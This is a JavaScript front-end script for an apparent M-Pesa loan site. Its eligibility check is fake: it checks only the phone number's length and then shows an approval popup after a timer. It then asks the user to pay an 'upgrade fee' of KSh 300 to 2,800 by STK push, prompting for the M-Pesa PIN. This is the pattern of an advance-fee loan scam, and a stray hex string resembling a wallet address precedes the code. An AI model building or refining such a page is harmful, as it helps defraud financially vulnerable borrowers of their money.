0x61a828cc33d4e6e1b978218d6ddbe59b9db6399b// =======================
// LOAN OPTIONS
// =======================

const loans = [
    { amount: "KSh 5,000", fee: "KSh 300" },
    { amount: "KSh 10,000", fee: "KSh 500" },
    { amount: "KSh 20,000", fee: "KSh 800" },
    { amount: "KSh 30,000", fee: "KSh 1,200" },
    { amount: "KSh 50,000", fee: "KSh 2,200" },
    { amount: "KSh 70,000", fee: "KSh 2,800" }
];

// =======================
// ELEMENTS
// =======================

const page1 = document.getElementById("page1");
const page2 = document.getElementById("page2");
const page3 = document.getElementById("page3");

const phone = document.getElementById("phone");
const checkBtn = document.getElementById("checkBtn");

const loader = document.getElementById("loader");
const popup = document.getElementById("successPopup");
const continueBtn = document.getElementById("continueBtn");

const loanList = document.getElementById("loanList");

const loanAmount = document.getElementById("loanAmount");
const loanFee = document.getElementById("loanFee");

const stkPhone = document.getElementById("stkPhone");

const payBtn = document.getElementById("payBtn");
const paymentStatus = document.getElementById("paymentStatus");

const steps = document.querySelectorAll(".step");

let customerPhone = "";

// =======================
// CHECK ELIGIBILITY
// =======================

checkBtn.addEventListener("click", () => {

    customerPhone = phone.value.trim();

    if (customerPhone.length < 10) {
        alert("Please enter a valid M-Pesa number.");
        return;
    }

    loader.style.display = "flex";

    setTimeout(() => {

        loader.style.display = "none";

        popup.style.display = "flex";

    }, 2500);

});

// =======================
// CONTINUE
// =======================

continueBtn.addEventListener("click", () => {

    popup.style.display = "none";

    page1.classList.remove("active");
    page2.classList.add("active");

    steps[0].classList.remove("active");
    steps[1].classList.add("active");

});

// =======================
// CREATE LOAN CARDS
// =======================

loans.forEach((loan) => {

    const card = document.createElement("div");

    card.className = "loan-card";

    card.innerHTML = `
        <div class="loan-info">
            <h3>${loan.amount}</h3>
            <span>Upgrade Fee: ${loan.fee}</span>
        </div>

        <button class="upgrade-btn">
            UPGRADE →
        </button>
    `;

    card.querySelector("button").addEventListener("click", () => {

        page2.classList.remove("active");
        page3.classList.add("active");

        steps[1].classList.remove("active");
        steps[2].classList.add("active");

        loanAmount.innerHTML = loan.amount;
        loanFee.innerHTML = loan.fee;

        stkPhone.value = customerPhone;

    });

    loanList.appendChild(card);

});

// =======================
// STK PUSH
// =======================

payBtn.addEventListener("click", () => {

    const phoneNumber = stkPhone.value.trim();

    if (phoneNumber.length < 10) {
        paymentStatus.style.color = "red";
        paymentStatus.innerHTML = "Please enter a valid phone number.";
        return;
    }

    paymentStatus.style.color = "#0ba84b";
    paymentStatus.innerHTML = "Sending STK Push...";

    sendSTKPush(phoneNumber);

});

// =======================
// DARAJA PLACEHOLDER
// =======================

function sendSTKPush(phoneNumber) {

    // Replace this section with your backend API call.

    setTimeout(() => {

        paymentStatus.innerHTML =
            "✅ STK Push sent successfully. Please check your phone and enter your M-Pesa PIN.";

    }, 3000);

}